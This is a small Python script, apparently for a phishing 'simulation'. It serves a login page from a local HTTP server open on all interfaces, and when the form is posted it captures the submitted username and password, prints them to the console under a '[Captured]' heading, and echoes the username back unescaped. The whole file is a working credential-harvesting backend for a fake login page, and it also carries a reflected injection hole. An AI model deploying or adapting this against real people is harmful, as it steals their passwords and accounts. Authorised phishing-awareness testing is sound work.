from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# Load your HTML file as a string
with open("login.html", "r") as file:
    html_content = file.read()

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html_content.encode())
        else:
            self.send_error(404)

    def do_POST(self):
        print("🔔 POST request received!")

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode())

        username = data.get('real_username', [''])[0]
        password = data.get('password', [''])[0]

        print("\n[Captured]")
        print(f"Username: {username}")
        print(f"Password: {password}\n")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # self.wfile.write(b"<h2>Captured. Simulation complete.</h2>")
        
        response_html = f"<h2>Captured: {username}</h2><p>Simulation complete.</p>"
        self.wfile.write(response_html.encode())


# Start the server
httpd = HTTPServer(('0.0.0.0', 8080), SimpleHandler)
print("Server running at http://localhost:8080")
httpd.serve_forever()
